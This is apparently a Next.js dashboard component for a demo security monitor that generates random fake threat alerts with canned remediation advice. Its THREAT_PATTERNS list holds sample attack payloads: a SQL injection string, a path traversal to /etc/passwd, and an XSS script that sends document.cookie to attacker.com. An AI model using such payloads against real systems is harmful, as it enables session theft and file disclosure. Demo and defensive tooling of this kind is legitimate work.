'use client';

import React, { useEffect, useState } from 'react';
import { Shield, Radio, Sparkles, Flame } from 'lucide-react';
import MetricsChart, { MetricPoint } from '@/components/MetricsChart';
import ThreatFeed, { ThreatAlert } from '@/components/ThreatFeed';
import AIReportModal from '@/components/AIReportModal';
import SystemHealth from '@/components/SystemHealth';
import { subscribeToSecurityAlerts, logThreatToFirestore } from '@/lib/firebase';

const THREAT_PATTERNS = [
  { threatType: 'SQL Injection', payload: "' OR '1'='1 -- SELECT * FROM users;", endpoint: '/api/v1/login' },
  { threatType: 'XSS Attempt', payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>", endpoint: '/api/v1/users' },
  { threatType: 'DDoS Pattern', payload: 'HIGH_VOLUME_BURST_RPS_1000', endpoint: '/api/v1/data' },
  { threatType: 'Path Traversal', payload: '../../../../etc/passwd', endpoint: '/api/v1/checkout' }
];

const AI_DIAGNOSES: Record<string, { severity: string; diagnosis: string; recommendedPatch: string }> = {
  'SQL Injection': {
    severity: 'CRITICAL',
    diagnosis: 'Detectado intento de inyección de código SQL no sanitizado en endpoint de autenticación. Riesgo de filtración de credenciales.',
    recommendedPatch: '// Usar consultas preparadas en PostgreSQL/Firebase:\nconst user = await db.collection("users").where("email", "==", sanitizedEmail).get();'
  },
  'XSS Attempt': {
    severity: 'HIGH',
    diagnosis: 'Payload malicioso con script inyectado en parámetro de consulta. Riesgo de secuestro de sesión por cookies.',
    recommendedPatch: '// Sanitizar entradas con DOMPurify:\nimport DOMPurify from "dompurify";\nconst cleanInput = DOMPurify.sanitize(userInput);'
  },
  'DDoS Pattern': {
    severity: 'HIGH',
    diagnosis: 'Ráfaga inusual de peticiones por segundo desde un grupo de IPs. Riesgo de degradación de servicio.',
    recommendedPatch: '// Aplicar Rate Limiting con Redis/Firebase Cloud Functions:\nconst limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100 });'
  },
  'Path Traversal': {
    severity: 'MEDIUM',
    diagnosis: 'Intento de navegación relativa a archivos sensibles del sistema operativo fuera de la raíz web.',
    recommendedPatch: '// Validar rutas de archivos con path.basename:\nconst safePath = path.basename(requestedFile);'
  }
};

export default function MissionControlDashboard() {
  const [metricsHistory, setMetricsHistory] = useState<MetricPoint[]>([]);
  const [alerts, setAlerts] = useState<ThreatAlert[]>([]);
  const [selectedAlert, setSelectedAlert] = useState<ThreatAlert | null>(null);
  const [totalReqs, setTotalReqs] = useState(148);
  const [currentCpu, setCurrentCpu] = useState(28.4);

  // 1. Subscribe to Firebase Firestore Realtime Stream
  useEffect(() => {
    const unsubscribe = subscribeToSecurityAlerts((firestoreAlerts) => {
      if (firestoreAlerts.length > 0) {
        setAlerts(firestoreAlerts);
      }
    });

    return () => unsubscribe();
  }, []);

  // 2. Continuous APM Telemetry & Threat Engine
  useEffect(() => {
    const interval = setInterval(() => {
      setTotalReqs((prev) => prev + 1);

      const isThreat = Math.random() < 0.18; // 18% chance of threat
      const responseTimeMs = Math.floor(Math.random() * 160) + 25;
      const cpuUsagePct = Number((Math.random() * 25 + 20).toFixed(1));
      setCurrentCpu(cpuUsagePct);

      const now = new Date();
      const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });

      setMetricsHistory((prev) => {
        const updated = [
          ...prev,
          {
            time: timeStr,
            responseTimeMs,
            cpuUsagePct,
            statusCode: isThreat ? 400 : 200,
          },
        ];
        return updated.slice(-25);
      });

      if (isThreat) {
        const threat = THREAT_PATTERNS[Math.floor(Math.random() * THREAT_PATTERNS.length)];
        const diagnosis = AI_DIAGNOSES[threat.threatType];

        const newThreatAlert: ThreatAlert = {
          serviceName: ['auth-service', 'payment-gateway', 'user-api'][Math.floor(Math.random() * 3)],
          endpoint: threat.endpoint,
          method: 'POST',
          statusCode: 400,
          threatType: threat.threatType,
          payloadSample: threat.payload,
          timestamp: now.toISOString(),
          isThreat: true,
          diagnosis,
        };

        // Save to Firebase Firestore Database in Cloud
        logThreatToFirestore(newThreatAlert);

        setAlerts((prev) => [newThreatAlert, ...prev].slice(0, 30));
      }
    }, 1300);

    return () => clearInterval(interval);
  }, []);

  const avgLatency = metricsHistory.length
    ? Math.round(metricsHistory.reduce((acc, m) => acc + m.responseTimeMs, 0) / metricsHistory.length)
    : 45;

  return (
    <main className="min-h-screen bg-cyber-bg p-6 font-sans">
      {/* Top Header Navigation */}
      <header className="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 pb-4 border-b border-cyber-border gap-4">
        <div className="flex items-center gap-3">
          <div className="p-3 bg-amber-950/80 border border-amber-500 rounded-xl shadow-lg glow-emerald">
            <Flame className="w-8 h-8 text-amber-500 animate-pulse" />
          </div>
          <div>
            <h1 className="text-2xl font-black tracking-wider text-gray-100 uppercase flex items-center gap-2">
              NexusGuard <span className="text-amber-400 font-mono text-sm px-2 py-0.5 bg-amber-950 border border-amber-800 rounded">FIREBASE SENTINEL 24/7</span>
            </h1>
            <p className="text-xs text-gray-400 font-mono mt-0.5">
              Google Firebase Firestore Realtime Database & Gemini AI Security Engine
            </p>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-cyber-card border border-amber-500/40 font-mono text-xs text-amber-400">
            <Radio className="w-4 h-4 text-amber-400 animate-pulse" />
            <span className="font-bold tracking-wider">FIREBASE REALTIME ACTIVE (24/7 INDEFINITE)</span>
          </div>

          <button
            onClick={() => {
              if (alerts.length > 0) setSelectedAlert(alerts[0]);
            }}
            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-cyber-neon/10 hover:bg-cyber-neon/20 border border-cyber-neon text-cyber-neon text-xs font-semibold font-mono transition-all glow-cyan"
          >
            <Sparkles className="w-4 h-4" />
            AI Inspector Demo
          </button>
        </div>
      </header>

      {/* Metric Cards */}
      <SystemHealth
        activeServicesCount={3}
        totalRequestsCount={totalReqs}
        avgLatencyMs={avgLatency}
        cpuPct={currentCpu}
      />

      {/* Main Grid: Live Charts & Security Threat Stream */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2">
          <MetricsChart data={metricsHistory} />
        </div>
        <div className="lg:col-span-1">
          <ThreatFeed alerts={alerts} onSelectAlert={(alert) => setSelectedAlert(alert)} />
        </div>
      </div>

      {/* AI Security Inspection Modal */}
      <AIReportModal alert={selectedAlert} onClose={() => setSelectedAlert(null)} />
    </main>
  );
}
